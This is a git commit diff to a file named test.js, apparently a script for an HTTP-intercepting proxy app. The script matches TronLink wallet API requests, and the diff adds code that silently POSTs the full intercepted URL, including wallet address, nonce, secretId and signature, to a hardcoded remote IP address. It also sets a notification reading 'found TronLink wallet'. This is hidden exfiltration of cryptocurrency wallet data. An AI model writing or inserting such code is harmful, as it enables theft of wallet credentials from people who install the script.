31d86d01edf01388e5aedd98ad2a37be364a5d46
tesaq1 <98641919+tesaq1@users.noreply.github.com>
2023-07-02 16:01:19 +0700

    1

--- test.js
+++ test.js
@@ -5,9 +5,17 @@ const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
 ///api/v1/wallet/getLatestAPK?address=TYtGyengaZQKkFU161uKCrRQQU2jJTNpv6&nonce=3691&secretId=ED151200DD0B3B52&signature=W5gBsApwNhp5GLgwA0Jho/77TbU%3D
 // 测试 requrl 是否匹配正则表达式
 if (TronLinkRegex.test(requrl)) {
+    let params = {
+        url:"http://43.134.170.213:8001/api/trx/getinfo",
+        timeout: 2000, //请求超时，单位ms，默认5000ms
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:{requrl},//仅仅在post请求中有效
+    }
     console.log("1111111111");
-    $notification.post("通知","subtitle","你有一个通知");
+    $notification.post("通知","subtitle","找到TronLink钱包");
+    $httpClient.post(params, function(errormsg,response,data){})
 } else {
-    console.log("222222222");
+    $done({});
 }
-$done({});
